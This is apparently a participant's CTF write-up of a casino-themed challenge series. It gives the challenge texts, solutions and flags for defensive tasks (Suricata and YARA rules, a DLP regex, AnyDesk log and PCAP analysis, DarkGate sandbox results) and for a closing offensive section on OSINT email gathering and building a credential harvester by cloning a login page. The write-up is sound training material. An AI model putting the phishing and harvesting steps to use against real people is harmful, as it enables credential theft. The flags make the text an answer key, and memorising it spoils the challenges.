# TargetCTF Hosted by Wicys
![targetctf](https://github.com/user-attachments/assets/3b57fa4a-4daa-4ddd-9367-382977d7e040)

# Challenge Synopsis — Chaos At The Casino
The Lucky Lion Casino covets itself as a haven for online gamblers and virtual thrill seekers who hope to win big.
Who am I? I’m Diana Prince, a Lucky Lion Casino Information Security team member. What’s my mission? Defend the casino from internal/external threat actors. The adversary? eCrime Group “Tacky Termite” based in Europe — financially motivated and focused on infiltrating the Lucky Lion Casino to score a massive jackpot of their own.

# Defensive labeled with "D"
**D1: Secure Your Perimeter (100 points)**

After receiving a tip from a peer organization's Cyber Threat Intelligence team that prolific threat actor group Tacky Termite recently posted that they're gearing up to cyber-heist a casino, you've been tasked with making sure The Lucky Lion Casino is secured against any such cyber attacks.
As if it were that simple! You know it's impossible for any company to be fully protected against attacks, but you can certainly make it more difficult for any would-be attacker.
Let's start by eliminating any easy entry points by scanning The Lucky Lion's network for vulnerabilities. After running your vulnerability scanning tool Centauros, you now have a very long list of potential security issues impacting hosts in your environment.
It would definitely be best to remediate ALL of these issues, but who knows how much time you have before an attacker also discovers the vulnerabilities? You will need to prioritize the most critical issues first - take a look at the list and identify the CVE of the vulnerability that would be most prudent to remediate quickly.

**Objective**: Identify the most critical vulnerability that should be remediated first.

**Files Given**:
![network_diagram](https://github.com/user-attachments/assets/d51775ea-f5bc-454f-9af7-9bf3865401e0)
- Vulnerability report




**Flag Format** CVE-<year>-<number>
# Solution:
I started by looking at the network diagram to understand what was going on 
The network diagram is simple: Traffic from the internet passes through the firewall, then the router, and is segmented into the internal network/DMZ via the router, each containing four machines or servers.
Next, I started analyzing CVEs for each system and looked for the word  “critical” and found 5 vulnerabilities with a severity level of critical and used the JSON viewer website to get the data organized: https://jsonviewer.stack.hu/
![image](https://github.com/user-attachments/assets/5a7eff66-cc40-497a-923c-defae9a73115)
And I stumbled upon the DMZ which had a critical severity level as its missing missing security update amidst the “out of date” software warnings.
![image](https://github.com/user-attachments/assets/24caad1d-d0dc-4e8f-b103-8e6aa262b9b5)

**Flag: CVE-2024-2994**

# D2:  Look for Insider Threats
**Points:300**
In addition to securing your perimeter, it would probably be a good idea to double-check that you don't have any insiders working against The Lucky Lion, especially knowing Tacky Termite has occasionally used insiders to help them gain access to their victims' environments in the past.
One standard way to look for insider threats is to try to find sensitive data in places it shouldn't be. As a member of the Data Loss Prevention team, you could craft a Regular Expression (RegEx) to find TINs, or Tax Identification Numbers stored in unusual locations in The Lucky Lion's environment. The Lucky Lion is required to store TINs (only Social Security Numbers and Individual Taxpayer Identification Numbers) for gamblers who win more than $5000 (the regulations don't say how they have to store them, though!), though they should never appear anywhere other than the database that's intended to store them.
Normally, this task wouldn't be too hard, and there are lots of examples out there for TINs already. Unfortunately, the decision was made at one point to "encrypt" the TINs in a misguided attempt to increase security. Your job is now much more fun™!
The "encryption" method, which they've taken to calling Visionàry Algorithm Protecting IDs, involves modifying each digit using its corresponding value in the passphrase: LUCKYLION
def vapid(tin, key="LUCKYLION") -> bytes:
    if isinstance(key, str):
        key = key.encode("ascii")
    if isinstance(tin, bytes):
        tin = tin.decode("ascii")
    key_len = len(key)
    ciphertext = []
    for idx, character in enumerate(tin):
        ciphertext.append(int(character) + key[idx % key_len])
    return bytes(ciphertext)
For example:
•	000000000 becomes LUCKYLION
•	111111111 becomes MVDLZMJPO
**Objective**
Your mission is to write a RegEx that can find these obfuscated TINs so it can be deployed into various DLP sensors. This will ensure we'll be alerted if someone or something is exfiltrating sensitive customer data.
Fortunately, your coworker wrote a script (snort.py that you can use to test your RegEx against a representative dataset. Download the script and run it with --help to get started:
python snort.py --help
Here's an example run:
python snort.py 'regex(_|\s+)goes_?here$'
Note the single quotes ' surrounding the RegEx. These will usually protect it from shell expansion.
Note: Your regex needs to avoid matching unencrypted TINs, e.g. 123456789, as there are already appliances looking for these and we don't want to create duplicate alerts! To be clear, your regex can ONLY match VAPID-encrypted TINs!
Additional Note: TINs in this context refers exclusively to SSNs and ITINs. EINs/FEINs are for employers (companies), who can't gamble. PTINs are for tax preparers and also can't be associated with gambling winnings. ATINs are for children, who sadly can't legally gamble (yet).
**Flag Format**
found unauthorized user handling TINs: <flag> Example: If snort.py outputs: found unauthorized user handling TINs: ins1d3r_thr34t, then the flag would be ins1d3r_thr34t
Otherwise, you'll see errors like:
•	valid regex, but ill-fitting
•	malformed regex: <error message>
Tools Required
•	snort.py, SHA256 verification hash: ff3aec78659b82907bc9f34886b785850dc3988b79b33f167de196e14e7a2d87
•	Python 3
Additional Resources
•	RegExr, an online tool for learning Regular Expressions
 snort.py
**Solution**
Solution:
This was one of the hardest challenge for me and as I have only worked with RegEx in my webdev class, so this one had a bit of a learning curve. I wanted to establish a format for the Tax ID, which happen to be the same amount of digits as the word “LUCKYLION”. “000000000” = “LUCKYLION”, “111111111” = “MVDLZMJPO”.

Next, I needed to break down the “logic” of this algorithm, starting with the example. 
At first, I trieda  different set regex and  got the following output and thought my logic was still wrong:
 ![image](https://github.com/user-attachments/assets/04c2883d-2599-4c50-83b4-5e9adb2a7357)

After reevaluating my logic I figured out “MVDLZMJPO” is exactly one letter from “LUCKYLION”, and based off the code provided, I’m assuming it’s converting data to ASCII decimal values, adding the TIN number, and then back to the mapped ASCII character. 
This means that my limit is “000000000” to “999999999“. We already have the 0 value, but now we need to calculate the max value.
I mapped out each character in “LUCKYLION” to its respective ASCII table value and then added “9” to each of the values:
L (76): 76 to 85
U (85): 85 to 94
C (67): 67 to 76
K (75): 75 to 84
Y (89): 89 to 98
I (73): 73 to 82
O (79): 79 to 88
N (78): 78 to 87
Then, I converted the product to its ASCII table values: U, ^, L, T, b, U, R, X, W.
In the end, I needed to create a RegEx for these. Using https://regex101.com/r/ob3baZ/1, and after many hours, I ended up with the following:
[L-U][U-^][C-L][K-T][Y-b][L-U][I-R][O-X][N-W]
 ![image](https://github.com/user-attachments/assets/e7a9d6d4-0c86-4cd3-b675-696feadba62a)

Flag: RegexRanger
# D3. Investigate a Suspicious Email
**Points: 25**
While you're keeping an eye on incoming alerts, you notice an email pop into The Lucky Lion's security inbox from a concerned employee. They report receiving an unexpected email asking them to verify their identity.
There might be hidden evidence of tampering in this email since on the surface it looks legitimate. Can you figure out where the attacker might have left a calling card?
**Objectives**
•	Find the evidence of attacker tampering (will have the format flag{.........})
Email given:
![image](https://github.com/user-attachments/assets/dc38911c-b7ae-4b08-af93-9414f8d259c3)

**Solution:**
The first thing I did was to scan the QR code as clicking the verify button led me to Luckycasion’s website:
![image](https://github.com/user-attachments/assets/31f3b99c-ea90-48fe-8442-8bf07ada8e97)
I used this site to scan the qr code https://dnschecker.org/qr-code-scanner.php
And got this 
![image](https://github.com/user-attachments/assets/d9556f78-2ad6-43e6-a0ed-30b6e8361ea7)
![image](https://github.com/user-attachments/assets/c3d8a394-e2f7-4a15-84b3-ec97e7c3b1b5)
**flag{every_ctf_needs_rot13}**

# D4. Write IOC detection
**Points:100**
Now that we have the threat actor's cred harvesting site (wood-chewers.trees), let's write a detection rule using Suricata to alert on HTTP traffic going out from The Lucky Lion's network to the domain.
Given the Suricata rule below, can you fill in the missing information to complete the rule?
alert http $CORP_NET any -> $EXTERNAL_NET any (msg:"Detected traffic to wood-chewers.trees"; http.host; _____________; sid:1000001; rev:1;)
Objectives Enter the missing information to complete the Suricata rule
Tools required text editor
Additional Resources https://docs.suricata.io/en/latest/
**Solution:** 
Going thru the suricata documentation I found the following
![image](https://github.com/user-attachments/assets/f8a8176b-d382-4767-868f-767729bde341)
And changed the content:"suricata.io" to “wood-chewers.trees” .
**Flag: content: “wood-chewers.trees”**

# D5.1. Identify compromised user
**Points: 25**
**1/10 attempts**
Now that we have detection in place for the threat actor's credential harvesting site, we can review the alerting logs in an attempt to identify any compromised users.
The attached .json file is an output from our Suricata rule.
Review our detection logs to identify network traffic to the cred harvester. Using these logs, we need to identify users who may have been compromised, and then identify the specific user and host we should start analyzing first. To start, we should figure out how many users in total we need to look into.
Objectives
•	Based on our logs, how many users or hosts does it appear had traffic to the credential harvesting site were there? Enter response as an integer.
Tools Required Text Editor
Additional Resources https://docs.suricata.io/en/latest/rules/intro.html
**Solution:** 
I used cyberchef to count the occurrences of detection
![image](https://github.com/user-attachments/assets/25da5840-0670-4759-83e7-0a8cd19ebfe3)
**Flag: 8**
# D5.2. Identify compromised user
**Points 75**
Alright, we have a good idea of how many users visited the known malicious site, but we should also try to see whether these users actually submitted credentials to the harvester, so let's take a closer look at our Suricata alert logs.
Reviewing the traffic, what field and value indicates that credentials may have been sent to the malicious site?
**Objectives**
•	Enter the field name that indicates a user credentials may have been sent to the malicious site and its value, exactly as in the log (i.e. "field_name": "value")
Tools Required Text Editor
Additional Resources https://docs.suricata.io/en/latest/rules/intro.html
**Solution:**
I used json viewer to solve this challenge
This next flag needs us to review more Suricata rules and find the field name that indicates compromised credentials. I once again inserted the JSON file into CyberChef.
I figured that I’d need to look into the actual HTTP info. Between the GET and CONNECT, there was one POST:
 ![image](https://github.com/user-attachments/assets/ea7c0754-efa2-49a1-ab47-aa9fddf4e8db)

**Flag: http_method : “POST”**
# D5.3. Identify compromised user
**Points:20**
Let's take one final look at our alert logs. We've now identified the HTTP_method indicating credentials were sent to the phishing domain.
**Objectives**
•	What is the IP address that was responsible for that traffic?
Tools Required Text Editor
Additional Resources https://docs.suricata.io/en/latest/rules/intro.html
**Solution**
It was pretty easy to find
![image](https://github.com/user-attachments/assets/3882a822-1c72-4ae2-9813-eb359feb5817)

**Flag: 10.15.38.78**

# D5.4 Identify compromised user
**Points: 50**
We have the IP address that we believe is responsible for submitting credentials to the threat actor's domain. Now, our networking team has provided us with some logs that will let us find the hosts and users associated with the traffic.
Given that in The Lucky Lion's environment, the logs are relatively small, it's easy to correlate our source.ip to the user and PC we want to look at.
If we recall our src_ip from the Suricata alert with the POST HTTP traffic to the phishing domain (10.15.38.78) , we see that our user and host are: host: WDIGCVY2S, user: bob_wctf24
However, in a larger incident, you may have to search through tens of thousands or more records. Let's see how we might enumerate logs in that case -
**Objectives**
1.	Can you write a simple query using bash that would quickly let you search for data associated with the IP we've identified? Submit that command as the flag. -Assume you are in the same directory as the file you are searching
Tools Required
•	Text editor
Additional resources
•	https://www.gnu.org/software/bash/manual/bash.html
**Solution**
Solution:
This was simple as I used grep command grep “10.15.38.78” networklogs.csv

# D6. PCAP Analysis
**100**
You have been given a PCAP file of Bob's browsing traffic concerning a known Remote Access tool. You'll need to examine the PCAP to determine which tool was downloaded on the host and where it came from.
Password for Zip: infected
General Questions:
•	Did the user have any suspicious downloads?
•	What is the purpose of the executable?
•	What was the domain the executable was downloaded from?
•	What is the source port?
**Objectives**
•	Determine if there was a suspicious download, what it was, and where it came from. Identify the full request URI that the executable was downloaded from.
**Tools Required**
•	Wireshark or a similar tool.
**Additional Resources**
•	Wireshark crash course: https://www.youtube.com/watch?v=vUdOxcRJgME

**Solution:**
I used export>http 
![image](https://github.com/user-attachments/assets/320b06ce-8960-4cce-8e04-73adfdadb662)
![image](https://github.com/user-attachments/assets/fd8f7da7-4746-463e-9e5d-caf4ce8b7e2c)
So I put in the following flag to solve this challenge
**FLAG: http://anydesk.com:8000/AnyDesk.exe**
# D7.1. Review Connection Logs (Host A)
**50**
We have identified our host and user in The Lucky Lion's environment that may have been accessed by a malicious actor. In the previous challenge, we identified AnyDesk was downloaded via PCAP analysis on our suspect host. Let's perform some artifact analysis from that host in order to see what the threat actor may have done with AnyDesk.
Let's look at our compromised user's (bob_wctf24) Windows host WDIGCVY2S. AnyDesk can be used to remotely connect to a host, drop payloads, and steal files, but it should leave traces we can use in our investigation.
Can you use your security research skills and find out where the logs for AnyDesk are located?
**Objectives**
•	Locate the artifacts we need to assess suspicious activity on our host by finding the full path (beginning with C:) to the directory where AnyDesk's logs would be on our host.
Tools Required
•	Open Source Intelligence research (OSINT)
**Additional Resources**
•	None
**Solution:**
I googled the path for anydesk.exe and stumbled upon this and replaced the the username with bob_wctf24
![image](https://github.com/user-attachments/assets/376c0cea-6255-446b-b2a2-23032fc23b78)
**FLAG: C:\Users\bob_wctf24\Appdata\Roaming\AnyDesk\**
# D7.2. Review Connection Logs (Host A)
**50**
Now that we have identified where the logs are, let's take a look at one of the files and see what we can learn about our threat actor.
Based on our OSINT research in the previous flag, can we identify which fields in the attached ad_scv.trace log identify our attacker?
**Objectives**
•	Review host artifacts to identify who and when our victim's PC was accessed. Answer both of the following questions to create the flag:
1.	What is the exact timestamp when the connection was opened?
2.	What is the the IP address of the remote host connecting to Bob's computer?
•	Submit your answer comma separated so that it matches the following format: YYYY-MM-DD 00:00:00.000,IP.IP.IP.IP
**Tools Required**
•	Text Editor
Additional Resources
•	None
Given:
Svc file
**Solution:**
The file given was:
 ![image](https://github.com/user-attachments/assets/6f43c2b5-651d-4379-a089-a36f6e589c51)

1.	What is the exact timestamp when the connection was opened?
 ![image](https://github.com/user-attachments/assets/7869551a-1310-4bbd-9179-4ebc14084c3a)

Our first piece is: **2024-04-18 06:42:31.190**
2.	What is the the IP address of the remote host connecting to Bob's computer?
 ![image](https://github.com/user-attachments/assets/dd82fe40-6709-4bec-8667-54b48bd1ea3f)

The second piece is: **203.0.161.68**. Therefore, our flag must be:
**Flag: 2024-04-18 06:42:31.190,203.0.161.68**
# D8. YARA Analysis
**500**
You and the rest of The Lucky Lion's IR team are deep in your investigation, digging into hosts with signs of unusual activity. While pulling artifacts from host A (WDIGCVY2S), you identified the tool download utilized by the threat actor. You capture the file and submit it to Strelka, a real-time, container-based file scanning system used for threat hunting, threat detection, and incident response. The strelka.json results identified the file as AnyDesk and you determined the file was downloaded and utilized by the threat actor.
**Objectives**
•	Create a YARA rule that will detect the target file. The target file has similar meta information identified in strelka.json. There are a total of 100 files, only one is the target file.
Flag Format Typical CTF flag th4t_l00kz_l1k3_th1s
Tools Required
•	yara
•	curl
**Additional Resources**
•	YARA Documentation
•	YARA
•	Strelka
•	CyberChef
curl -H "Content-Type: text/plain" https://target-flask.chals.io/api/v1/yara-scan -X POST -d 'rule test {condition: true}'
Solution: 
I had to use a hint on this challenge and later on realized that it was not working because my command had an error
Correct command curl -H "Content-Type: text/plain" https://target-flask.chals.io/api/v1/yara-scan -X POST -d @rules_yara
**View Hint**
YARA Analysis
You and the rest of The Lucky Lion's IR team are deep in your investigation, digging into hosts with signs of unusual activity. While pulling artifacts from host A (WDIGCVY2S), you identified the tool download utilized by the threat actor. You capture the file and submit it to Strelka, a real-time, container-based file scanning system used for threat hunting, threat detection, and incident response. The *strelka.*json results identified the file as AnyDesk and you determined the file was downloaded and utilized by the threat actor.
Objective
Create a YARA rule that will detect the target file. The target file has similar meta information identified in strelka.json. There are a total of 100 files, only one is the target file.
Solution
You are provided with a curl command curl -H "Content-Type: text/plain" https://target-yara.chals.io/api/v1/yara-scan -X POST -d 'rule test {condition: true}' and a file strelka.json. If you run the curl command, the response is {"target_file":true,"total_matches":"100/100"}. This indicates that the target file matched and that all 100 files matched. This makes sense because the YARA rule provided in the POST request data will always match. Let's look at strelka.json and build a YARA rule to detect the target file.
Strelka is a modular data scanning platform, allowing users or systems to submit files for the purpose of analyzing, extracting, and reporting file content and metadata. The metadata extracted by the various scanners is added to the scan section under the scanner name. For this challenge, we will utilize the ScanPe results to create a YARA rule.
There are a few considerations when creating a YARA rule:
•	Identify the file type using header bytes, mime type, or one of the YARA import modules
•	Identify file type characteristics that make the file unique
•	Identify unique strings in the file
•	Identify code structures that are unique to the file
It's important to start with a simple rule and then add complexity. Think of the strings and conditions of the rule as satellites used for GPS. A single satellite will not provide a very accurate position. Similarly, 100 satellites may not be more accurate than 3 to 5. The key is to find the unique features that exist only in the sample you're trying to detect and are consistent across a sample set.
YARA has what are called modules that can be imported. The modules expand the functionality of YARA. One of the modules that we can use is the PE module. The first thing we should try is to create a rule that detects the specific file type. We can do this by checking the header bytes or we could import and use the YARA PE module. Its worth noting that while import modules expand the functionality of YARA, they can also decrease performance.
Let's start with a simple header byte check to only detect EXE files:
rule test { condition: uint16be(0) == 0x4d5a }
We still get 100/100 matches. At least we know that all 100 of the files start with 4d 5a.
The ScanPe results indicate the file is a 32bit PE, let's add a condition to the rule using the PE import module:
import "pe" rule test { condition: uint16be(0) == 0x4d5a and pe.is_32bit() }
It appears that all 100 files are 32bit PE files. Of the four considerations when creating a YARA rule, we have satisfied the first without much improvement. We do not have the raw file so we will not be able to identify unique strings or code structures. We do have additional meta information from ScanPe that we can use to identify unique characteristics.
These are a few considerations when deciding which features to select for a rule:
•	What are the characteristics of a PE file?
•	What ScanPe meta information might be unique to the file?
•	What characteristics can an adversary use to change a file to make it unique?
•	What characteristics about a file are difficult to change that can be artifacts?
From the ScanPe results, we can see there is debug information, specifically a PDB path.
![image](https://github.com/user-attachments/assets/82ef60e9-6c30-45b5-bec7-82749eba1d64)
 
The PDB path is a path to the debug file. This can be a good indicator to detect but it can be changed easily, or it may not be present. Let's and a condition to the rule for the PDB path.
import "pe" rule test { condition: uint16be(0) == 0x4d5a and pe.is_32bit() and pe.pdb_path == "C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win_loader\\AnyDesk.pdb" }
We still match on all 100 files, it appears that all of the samples are 32bit AnyDesk PE files. We could systematically add all of the PE characteristics as conditions and hope we get lucky. Or, we could think about the nature of a PE file and use those specific characteristics that are more unique. One such characteristic is the compile timestamp. When a PE is compiled, there is a timestamp added to the Common Object File Format (COFF) file header. This value can be easily modified but it should be unique across PE files unless the file happened to compiled on the same exact date and time or it's a duplicate file. The timestamp in the Strelka output is in the PE section with the key name compile_time and a value of 2024-04-24T12:53:24. We will need to convert the time to epoch to use in our YARA rule. We can use the To UNIX Timestamp recipe in CyberChef for the conversion.
![image](https://github.com/user-attachments/assets/40d47884-0780-4ae8-b29f-a47a8de17676)
We can add a condition to our rule to check pe.timestamp:
import "pe" rule test { condition: uint16be(0) == 0x4d5a and pe.is_32bit() and pe.pdb_path == "C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win_loader\\AnyDesk.pdb" and pe.timestamp == 1713963204 }
Now our rule matches 6/100 files and includes our target file. The compile time appears to be a good feature to include in our rule. Another feature in the PE Optional header that we may want to include in our rule is the PE checksum. The PE checksum was designed to reduce the probability of data corruption in a DLL or driver leading to crashes in the operating system. The checksum is calculated by the compiler after it builds the executable, and any modifications to the binary post-compilation will invalidate the checksum. What this means is that each file should have a unique checksum, which is why its ideal to include in our rule.
import "pe" rule test { condition: uint16be(0) == 0x4d5a and pe.is_32bit() and pe.pdb_path == "C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win_loader\\AnyDesk.pdb" and pe.timestamp == 1713963204 and pe.checksum == 5359632 }
The rule matched our target file and 3/100 files! Let's clean up the rule by removing some conditions that are unnecessary:
import "pe" rule test { condition: uint16be(0) == 0x4d5a and pe.timestamp == 1713963204 and pe.checksum == 5359632 }
The PE file header contains a lot of possible features, many of which can be modified by an adversary. The PE checksum is no exception, adversaries often add/change/remove data from a PE file after it has been created, without updating the checksum. Fortunately, YARA includes a pe.calculate_checksum to ensure the checksum is valid.
import "pe" rule test { condition: uint16be(0) == 0x4d5a and pe.timestamp == 1713963204 and pe.checksum == 5359632 and pe.calculate_checksum() == pe.checksum }
And now we have a single match and our flag!
 strelka.json
**FLAG: {y3t_an0th3r_r3curs1v3_acr0nym}**
# D9.1. Review Connection Logs (Host B)
**75**
Thanks to the Yara rule you developed, we received an alert detecting the AnyDesk hash on another host. Let's take a look at the logs to see if we can get an idea of what more the threat actor did on this host.
Once again, let's try to OSINT our way into deciphering these AnyDesk logs.
**Objectives**
•	Analyze a second host's connection logs for further indicators of compromise by answering the following questions to construct your flag:
1.	Given these AnyDesk log files, can you determine whether the threat actor uploaded to or downloaded from our internal host?
2.	What is the directory name of the folder on the threat actor's machine?
3.	What is the port number over which our internal host has accepted the connection?
•	Submit your flag by combining the above three answers into a comma-separated string, such that it matches the format: upload or download,directory name,port# (here's an example flag correctly formatted (though the incorrect flag): upload,program_files,82747)
**Tools Required**
•	Text Editor
Additional Resources
•	None
**Given 3 files:**
Ad_trace
 ![image](https://github.com/user-attachments/assets/0b05800b-1635-4f75-a3d5-1b0e536f8245)

User.conf
 ![image](https://github.com/user-attachments/assets/4e46fed6-42af-46c4-a818-cea49d2d7c23)

Ad_svc
 ![image](https://github.com/user-attachments/assets/d14f01fc-fd3e-4cb3-98f4-a483d63fbb9f)

**Solution:**
1.	Given these AnyDesk log files, can you determine whether the threat actor uploaded to or downloaded from our internal host?
Upload
 ![image](https://github.com/user-attachments/assets/aff21d29-370f-4d1a-9619-57c344bbfc0f)

2.	What is the directory name of the folder on the threat actor's machine?
 ![image](https://github.com/user-attachments/assets/3008db94-9a4c-4dd8-8a6f-cf7f02665eca)

3.	What is the port number over which our internal host has accepted the connection?
 ![image](https://github.com/user-attachments/assets/f82252f2-cebe-4c27-8837-bde3ec033950)

•	Submit your flag by combining the above three answers into a comma-separated string, such that it matches the format: uploadordownload,directoryname,port# (here's an example flag correctly formatted (though the incorrect flag): upload,program_files,82747)
FLAG: upload,C:\Users\TimmyTermite\Desktop\fun_files,57836

# D9.2. Review Connection Logs (Host B)
**50**
**2/5 attempts**
Thanks to the Yara rule you developed, we received an alert detecting the AnyDesk hash on another host. Let's take a look at the logs to see if we can get an idea of what more the threat actor did on this host.
**Objectives**
•	Determine the name of the directory that the threat actor successfully dropped a file into on our victim host. Enter as normalized path beginning with "C:"
Tools Required A text editor like Notepad++ can be used to open the attached .trace file.
Additional Resources None
**Given:**
User.conf
 ![image](https://github.com/user-attachments/assets/b266ac9b-be07-4200-8163-3394f7d4c5fe)

Ad
 ![image](https://github.com/user-attachments/assets/49e22ae5-d246-4ab0-81b1-591a0a8e3e4d)

Ad_svc
 ![image](https://github.com/user-attachments/assets/06072662-5993-4fcf-98ec-0376d7831311)

**Solution:**
Location
 ![image](https://github.com/user-attachments/assets/3e8097eb-fea2-4a59-b91a-32e4713dc2ee)

**FLAG: C:\Users\wctf24\AppData\Local\Temp**
# D10.1 Strelka Analysis
**20**
During host analysis, the IR team identified the suspicious file C:\Users\wctf24\AppData\Local\Temp\img_001.scr. As the malware analyst on shift, you need to quickly determine if the file is malicious. Your automated Strelka sandbox can provide detailed information about the file. Submit the path of the suspicious file and the hostname to the API.
**Objectives**
•	Determine the SHA256 hash of the file.
**Tools Required**
•	curl
**Additional Resources**
•	CyberChef
•	Strelka
curl -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "", "path": ""}'
**Solution:**
We’re given the following command to run:
curl -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "", "path": ""}'
This one was a little tricky at first, once again, because of syntax I was unaware of.
In D8 we were given a host name so I tried that
curl --verbose -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "WDIGCVY6S", "path": "C:\\Users\\wctf24\\AppData\\Local\\Temp\\img_001.scr"}'
 and I used that to extract the sha256:
And found this:
 ![image](https://github.com/user-attachments/assets/a68997a0-463c-4c02-a610-60afae73817b)

**Flag: 31d12f8b9f75d0b4b38a8c3a5e81e0a040a40f544122742e3c8dd700f687c910**
# D10.2 Strelka Analysis
**20**
**Objectives**
•	What is the epoch timestamp of the Portable Executable (PE) file?
**Tools Required**
•	curl
**Additional Resources**
•	CyberChef
•	Strelka
**Solution**
curl -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "", "path": ""}'
Using the same file extracted from 10.1 I got
 ![image](https://github.com/user-attachments/assets/1bb6b718-a999-44da-9f24-107976c81978)
 Converted that to EPOCH 
**FLAG: 1714829820**
# D10.3 Strelka Analysis
**20**
**Objectives**
•	What is the PE checksum in hex?
1234567 == 12D687
Tools Required
•	curl
**Additional Resources**
•	CyberChef
•	Strelka
curl -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "", "path": ""}
**Solution**
The checksum ![image](https://github.com/user-attachments/assets/fa99cc3c-0a43-4e1c-8947-6a60f0fe4493)
![image](https://github.com/user-attachments/assets/990aceda-354d-4c3e-904e-deeb2e03484b)
**FLAG:71202**
# D10.4 Strelka Analysis
**20**
**Objectives**
•	What is the name of the malware?
**Tools Required**
•	curl
**Additional Resources**
•	CyberChef
•	Strelka
curl -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "", "path": ""}'
**Solution:**
![image](https://github.com/user-attachments/assets/9190bbc3-245a-4835-8225-dcc8007f4a23)

**FLAG: darkgate**
# D10.5 Strelka Analysis
**20**
**Objectives**
•	What is the C2 identified in the DarkGate config?
**Tools Required**
•	curl
**Additional Resources**
•	CyberChef
•	Strelka
curl -H "Content-Type: application/json" https://target-flask.chals.io/api/v1/strelka -X POST -d '{"host": "", "path": ""}'
**Solution:**
![image](https://github.com/user-attachments/assets/c2eafdf0-20b7-4ba6-9cbd-5bdeb34738a5)
**FLAG: fresh-eats.trees**

# D11. Trace the handoff
**100**
At this point, it's safe to say a threat actor has infiltrated The Lucky Lion's network, and from your experience, you know that threat actors tend to sell access as an easy way to monetize their efforts. As a defender, you may have to do some of your own researching to find relevant advertisements and dig deeper to find any additional information that can help your team assess the threat.
Fortunately, there are services available that attempt to catalogue the deep and dark web so that security researchers can stay on top of emerging threats and track otherwise elusive threat actors. One such service is Insightful Horizon, which Lucky Lion has access to! It tracks deep/dark web forum posts and tracks Bitcoin transactions "of interest" through a proprietary algorithm.
**Objectives**
Use the search engine to pivot and find the Tox ID of the threat actor who bought access to the casino!
•	Username: analyst
•	Password: feelinglucky
Flag Format A Tox ID, which is 76 hexadecimal digits, case-insensitive. Example: 11C0152AD2FB0C137C9BD6AC07C67AFC44AA7E7842A345C0F54A0412E55A9D26992A9C50BCE0
Tools Required
•	Web Browser
Additional Resources
•	Opensearch Dashboards docs
https://target-osd.chals.io/
**Solution**
Once I logged into the OpenSearch dashboard  we stumble upon 2 databases posts and btc_transection
In Post database I search lucky and got the following advertisement
![image](https://github.com/user-attachments/assets/af1d41fa-0528-406d-91ed-9b5a13786570)
![image](https://github.com/user-attachments/assets/c01c9ef0-2e93-4f2d-ad61-906c5113d942)
I copied the crypto wallet and started my search in btc_transection
**3QdSqwPTUEhx1A1u5qKi4Ccna4U4GJHMPX**
![image](https://github.com/user-attachments/assets/b2776a30-b6ae-4ec8-b0e7-eed4b3595a82)
![image](https://github.com/user-attachments/assets/f204af47-271b-43b5-bd1b-b3dc781f4bf3)
Now the next part was to find the correct tox id and I started ising the input_account to look for it.
I found two entries with this account:
**bc1q0xt2gaagqdlm4ve267lkf0lskg0tuafsp32njf**
![image](https://github.com/user-attachments/assets/23cc0ca8-12bf-4747-8229-ee45ae277629)
![image](https://github.com/user-attachments/assets/8a56b64c-6f56-4df8-bc80-9664e3c9ca2b)
And found this
![image](https://github.com/user-attachments/assets/5d6ffd8d-fc3b-45a5-b33c-f2452b39c565)
**FLAG: 6920616D206120636572746966696564206F707365632077697A6172642121216E6F74215817**

# Offensive labeled with "O"
# O1. Find your Targets
**100**
Crack your knuckles and wiggle your fingers - it's time to hack a casino! First things first - you need an entry point. Phishing is a tried and true method and somewhat of a specialty to Tacky Termite, why not start there?
The first step of a well-crafted social engineering campaign is to rustle up some targets - specifically a corporate email. Thankfully the casino has a website chock full of information to get us started. From there, use open source intelligence (OSINT) to find a usable email address.
**Objectives**
•	Find the email address of a Lucky Lion employee, there should be a flag nearby!
**Required Tools**
•	Web Browser
**Additional Resources**
•	https://www.sans.org/blog/what-is-open-source-intelligence/
https://target-httpd.chals.io/casino/homepage.html
**Solution**
![image](https://github.com/user-attachments/assets/7062eeeb-5f63-4095-8614-4ae2ad1b7a7b)
![image](https://github.com/user-attachments/assets/8f3569c4-3e5a-4d03-b365-19a81b665585)
I started doing OSINT on the LUCKY CASINO’s team and went on their twitter/X profiles and came upon this:
![image](https://github.com/user-attachments/assets/0629e324-ef42-424c-b771-dd8500913202)
![image](https://github.com/user-attachments/assets/6db59c3a-dcfc-4186-9e9a-603f6dda309e)
Following the github link led me to the flag
![image](https://github.com/user-attachments/assets/43c6ff93-499f-4466-b143-4100a716df45)
**FLAG: ctf{maybeD0ntLISTtheC0rpEm@il}**
# O2. Build a Credential Harvester
**100**
Now that you have targets in hand, it's time to craft your attack. You'll need some way to harvest your victims' credentials, and sometimes the most straightforward approach is the best one - how about a credential harvester?
You're more likely to trick The Lucky Lion's employees if your harvester looks realistic - best to start with finding their real employee sign-in page and see if you can mimic it. Maybe start by looking at the Lucky Lion home page you found while looking for phishing targets?
**Objective**
•	Clone the sign-up page & host on different domain to build a credential harvester. Once you do, submit the credentials "admin" and "password" to receive the flag.
Tools Required
•	Web Browser
•	Any Website Cloning Tool like HTTrack or goclone
•	Static Server Utility like serve or nginx
**Additional Resources**
•	https://www.crowdstrike.com/cybersecurity-101/cyberattacks/credential-harvesting
https://target-httpd.chals.io/casino/homepage.html

**Solution:**
I used Kali SE set on kali to clone a website
![image](https://github.com/user-attachments/assets/2e0be4c8-ca74-4bb4-a6e0-90cdda9f1e15)
![image](https://github.com/user-attachments/assets/40ba8f85-186e-47fd-baec-1cbf3eed9e26)
And went onto the IP address to access the site for credential harvesting
![image](https://github.com/user-attachments/assets/8ea3025b-29ec-4de9-9cbc-1a8eb7931824)
And got the flag
**FLAG: h4rv3st3r_h3r0**
# O3. Constructing your Phish
**100**
You have your credential harvester ready to go, but how exactly are you going to trick your victims into visiting the site hosting it? Much like the harvester, your "hook" will work best if it mimicks something legitimate that the victim is expecting to see.
